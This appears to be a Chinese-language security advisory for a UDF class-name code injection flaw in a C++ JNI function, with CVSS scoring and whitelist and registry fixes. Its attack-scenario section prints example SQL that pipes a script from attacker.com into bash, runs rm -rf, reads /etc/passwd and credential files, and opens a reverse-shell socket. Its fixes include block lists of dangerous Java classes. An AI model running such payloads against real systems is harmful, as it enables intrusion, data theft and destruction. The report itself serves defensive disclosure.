# VULN-DF-UDF-001：UDF类名代码注入漏洞

## 漏洞概述

| 属性 | 值 |
|------|-----|
| **漏洞ID** | VULN-DF-UDF-001 (同时涉及 VULN-SEC-UDF-001) |
| **类型** | 代码注入 / 任意代码执行 |
| **CWE** | CWE-94 (Improper Control of Generation of Code) |
| **严重程度** | Critical |
| **置信度** | 85/100 |
| **影响模块** | udf, codegen |
| **文件位置** | `core/src/udf/cplusplus/java_udf_functions.cpp:42-73` |
| **函数名** | `ExecuteHiveUdfSingle` |

## 技术分析

### 漏洞代码

```cpp
void ExecuteHiveUdfSingle(int64_t contextPtr, const char *udfClass, int32_t *inputTypes, int32_t retType,
    int32_t vecCount, int64_t inputValueAddr, int64_t inputNullAddr, int64_t inputLengthAddr, 
    int64_t outputValueAddr, int64_t outputNullAddr, int64_t outputLengthAddr)
{
    auto executorCls = JniUtil::GetHiveUdfExecutorCls();
    auto executeSingleMethod = JniUtil::GetExecuteSingleMethod();

    // 准备 JNI 调用
    auto env = JniUtil::GetJNIEnv();
    if (env == nullptr) {
        SetError(contextPtr, GET_ENV_FAILED);
        return;
    }
    
    // 危险操作：直接从外部输入创建 Java 类名字符串，无任何验证
    jstring jUdfClassName = env->NewStringUTF(udfClass);
    if (jUdfClassName == nullptr) {
        SetError(contextPtr, JVM_OOM);
        return;
    }

    // 准备参数类型
    auto dataTypeIdCls = JniUtil::GetDataTypeIdCls();
    jobjectArray jParamTypes = CreateInputTypeArray(env, dataTypeIdCls, inputTypes, vecCount);
    auto jRetType = env->GetStaticObjectField(dataTypeIdCls, JniUtil::GetFieldId(retType));

    // 危险操作：直接调用任意 Java 类的静态方法
    env->CallStaticVoidMethod(executorCls, executeSingleMethod, jUdfClassName, jParamTypes, jRetType,
        inputValueAddr, inputNullAddr, inputLengthAddr, outputValueAddr, outputNullAddr, outputLengthAddr);
    
    if (env->ExceptionCheck()) {
        auto msg = JniUtil::GetExceptionMsg(env);
        SetError(contextPtr, msg);
    }
    env->DeleteLocalRef(jUdfClassName);
}
```

### 漏洞机制

1. **外部输入直接传入**: `udfClass` 参数来自用户定义的 UDF 类名，无任何过滤
2. **JVM 类加载**: `HiveUdfExecutor.executeSingle` 会根据 `udfClass` 加载并执行对应的 Java 类
3. **无白名单验证**: 没有检查类名是否在允许的 UDF 白名单中
4. **全限定类名可控制**: 攻击者可以指定任意 Java 类的全限定名（如 `java.lang.Runtime`）

### 数据流

```
用户 SQL 查询 (定义 UDF)
    ↓
Spark/Presto 解析
    ↓
UDF 类名提取 (udfClass 参数)
    ↓
ExecuteHiveUdfSingle(const char *udfClass, ...)  [无验证]
    ↓
NewStringUTF(udfClass) → jstring
    ↓
CallStaticVoidMethod(executorCls, executeSingleMethod, jUdfClassName, ...)
    ↓
Java: HiveUdfExecutor.executeSingle(jUdfClassName, ...)
    ↓
Class.forName(jUdfClassName) / 类加载 / 方法调用
    ↓
任意 Java 类代码执行
```

### 跨模块追踪

从代码分析可见，此漏洞涉及跨模块数据流：

```
[IN] 数据流入 udf 模块:
  - core/src/udf/cplusplus/java_udf_functions.cpp:42
    数据: udfClass (UDF 类名字符串)
    来源: 来自 SQL 查询解析结果

[OUT] 数据流出 udf 模块:
  - core/src/udf/cplusplus/java_udf_functions.cpp:66
    数据: jUdfClassName
    流向: JVM HiveUdfExecutor.executeSingle
```

## 攻击场景演示

### 场景 1: 任意 Java 类执行

```sql
-- 恶意 SQL 查询
CREATE TEMPORARY FUNCTION exploit AS 'java.lang.Runtime';

SELECT exploit('exec', 'rm -rf /tmp/*') FROM some_table;
-- 或更危险的：
SELECT exploit('exec', 'curl attacker.com/malware.sh | bash') FROM some_table;
```

### 场景 2: 文件系统操作

```sql
-- 使用 Java IO 类读取敏感文件
CREATE TEMPORARY FUNCTION read_file AS 'java.io.FileInputStream';

SELECT read_file('/etc/passwd') FROM some_table;
-- 或读取配置文件中的密码
SELECT read_file('/app/config/database.properties') FROM some_table;
```

### 场景 3: 网络攻击

```sql
-- 使用 Java Socket 类建立反向连接
CREATE TEMPORARY FUNCTION connect AS 'java.net.Socket';

SELECT connect('attacker.com', 4444) FROM some_table;
-- 建立反向 shell 连接
```

### 场景 4: 反序列化攻击

```sql
-- 加载恶意类进行反序列化攻击
CREATE TEMPORARY FUNCTION deserialize AS 'org.apache.commons.collections.functors.InvokerTransformer';

SELECT deserialize(malicious_payload) FROM some_table;
-- 利用已知反序列化漏洞库实现 RCE
```

### 场景 5: 权限绕过

```sql
-- 直接调用安全管理器禁用方法
CREATE TEMPORARY FUNCTION bypass AS 'java.lang.System';

SELECT bypass('setSecurityManager', null) FROM some_table;
-- 禁用安全检查后执行其他攻击
```

## 影响评估

### 直接影响

| 影响 | 严重程度 | 说明 |
|------|---------|------|
| **任意代码执行** | Critical | 可执行任意 Java 类的任意方法 |
| **文件读写** | Critical | 可读写服务器任意文件 |
| **网络连接** | High | 可建立反向 shell |
| **数据泄露** | Critical | 可读取数据库配置、密码等 |
| **权限提升** | Critical | 可调用安全管理器相关类 |

### 业务影响

1. **数据安全**: 攻击者可读取数据库中的所有敏感数据
2. **服务安全**: 攻击者可执行任意系统命令
3. **横向移动**: 可通过网络连接攻击其他内网系统
4. **数据破坏**: 可删除或篡改关键业务数据

### CVSS 评估

| 指标 | 值 | 说明 |
|------|-----|------|
| Attack Vector | Network | 通过 SQL 查询触发 |
| Attack Complexity | Low | 直接构造恶意 UDF 类名即可 |
| Privileges Required | Low | 需要有 SQL 查询权限 |
| User Interaction | None | 无需用户交互 |
| Scope | Changed | 可影响整个 JVM 环境 |
| Confidentiality | High | 可读取任意数据 |
| Integrity | High | 可修改任意数据 |
| Availability | High | 可导致服务中断 |

**CVSS 评分: 10.0 (Critical)**

## 修复建议

### 短期修复 - 白名单验证

```cpp
void ExecuteHiveUdfSingle(int64_t contextPtr, const char *udfClass, int32_t *inputTypes, int32_t retType,
    int32_t vecCount, ...)
{
    // 修复 1: 白名单验证
    static const std::set<std::string> allowedUdfClasses = {
        "com.example.udf.ValidUdf1",
        "com.example.udf.ValidUdf2",
        // ... 只允许预定义的 UDF 类
    };
    
    if (!allowedUdfClasses.contains(udfClass)) {
        SetError(contextPtr, "UDF class not in whitelist: " + std::string(udfClass));
        return;
    }
    
    // 修复 2: 包名前缀验证
    static const std::vector<std::string> allowedPrefixes = {
        "com.example.udf.",
        "org.apache.hadoop.hive.udf.",
    };
    
    bool prefixValid = false;
    for (const auto& prefix : allowedPrefixes) {
        if (strncmp(udfClass, prefix.c_str(), prefix.length()) == 0) {
            prefixValid = true;
            break;
        }
    }
    if (!prefixValid) {
        SetError(contextPtr, "UDF class prefix not allowed: " + std::string(udfClass));
        return;
    }
    
    // 修复 3: 黑名单检查（禁止危险的 Java 核心类）
    static const std::set<std::string> forbiddenClasses = {
        "java.lang.Runtime",
        "java.lang.ProcessBuilder",
        "java.lang.System",
        "java.io.File",
        "java.io.FileInputStream",
        "java.io.FileOutputStream",
        "java.net.Socket",
        "java.net.URL",
        "java.lang.Class",
        "java.lang.reflect.",
    };
    
    for (const auto& forbidden : forbiddenClasses) {
        if (strstr(udfClass, forbidden.c_str()) != nullptr) {
            SetError(contextPtr, "Dangerous class blocked: " + std::string(udfClass));
            return;
        }
    }
    
    // 原有逻辑
    auto env = JniUtil::GetJNIEnv();
    if (env == nullptr) {
        SetError(contextPtr, GET_ENV_FAILED);
        return;
    }
    jstring jUdfClassName = env->NewStringUTF(udfClass);
    // ...
}
```

### 长期修复 - UDF 注册机制

```cpp
// UDF 注册表
class UdfRegistry {
private:
    static std::unordered_map<std::string, UdfMetadata> registeredUdfs_;
    static std::mutex mutex_;
    
public:
    // 系统管理员注册允许的 UDF
    static void RegisterUdf(const std::string& className, const UdfMetadata& metadata) {
        std::lock_guard<std::mutex> lock(mutex_);
        registeredUdfs_[className] = metadata;
    }
    
    // 执行前验证
    static bool IsUdfAllowed(const std::string& className) {
        std::lock_guard<std::mutex> lock(mutex_);
        return registeredUdfs_.contains(className);
    }
    
    // 获取 UDF 元数据（用于权限检查）
    static UdfMetadata* GetUdfMetadata(const std::string& className) {
        std::lock_guard<std::mutex> lock(mutex_);
        auto it = registeredUdfs_.find(className);
        return (it != registeredUdfs_.end()) ? &it->second : nullptr;
    }
};

// 修改后的执行函数
void ExecuteHiveUdfSingle(int64_t contextPtr, const char *udfClass, ...) {
    // 强制验证
    if (!UdfRegistry::IsUdfAllowed(udfClass)) {
        SetError(contextPtr, "UDF not registered: " + std::string(udfClass));
        return;
    }
    
    // 可选：权限检查
    auto metadata = UdfRegistry::GetUdfMetadata(udfClass);
    if (metadata != nullptr && !CheckUserPermission(contextPtr, metadata->requiredPermission)) {
        SetError(contextPtr, "User lacks permission to execute UDF: " + std::string(udfClass));
        return;
    }
    
    // 原有逻辑
    // ...
}
```

### Java 层面加固

```java
// HiveUdfExecutor.java - 增强验证
public class HiveUdfExecutor {
    private static final Set<String> FORBIDDEN_PACKAGES = Set.of(
        "java.lang", "java.io", "java.net", "java.reflect",
        "javax.management", "sun.", "com.sun."
    );
    
    public static void executeSingle(String udfClassName, ...) {
        // 包名检查
        for (String forbidden : FORBIDDEN_PACKAGES) {
            if (udfClassName.startsWith(forbidden)) {
                throw new SecurityException("Forbidden UDF class: " + udfClassName);
            }
        }
        
        // 使用安全管理器限制
        SecurityManager sm = System.getSecurityManager();
        if (sm != null) {
            sm.checkPermission(new UdfPermission(udfClassName));
        }
        
        // 加载并执行
        Class<?> udfClass = Class.forName(udfClassName);
        // 确保类实现了 UDF 接口
        if (!UDFInterface.class.isAssignableFrom(udfClass)) {
            throw new SecurityException("Class does not implement UDF interface");
        }
        
        // 执行 UDF
        // ...
    }
}
```

### 配置层面建议

```properties
# udf_whitelist.properties
# 只允许以下 UDF 类执行
allowed.udf.classes=com.example.udf.*,org.apache.hadoop.hive.udf.*

# 禁止以下包名
forbidden.udf.packages=java.lang,java.io,java.net

# 启用 UDF 注册模式
udf.registration.required=true
```

## 相关漏洞

- **VULN-DF-UDF-002 / VULN-SEC-UDF-002**: `ExecuteHiveUdfBatch` 存在相同问题

建议对所有 UDF 执行路径统一实施白名单验证和注册机制。

## 参考

- [CWE-94: Improper Control of Generation of Code](https://cwe.mitre.org/data/definitions/94.html)
- [Hive UDF Security - Apache Documentation](https://cwiki.apache.org/confluence/display/Hive/HivePlugins)
- [Java Security Manager](https://docs.oracle.com/javase/8/docs/technotes/guides/security/)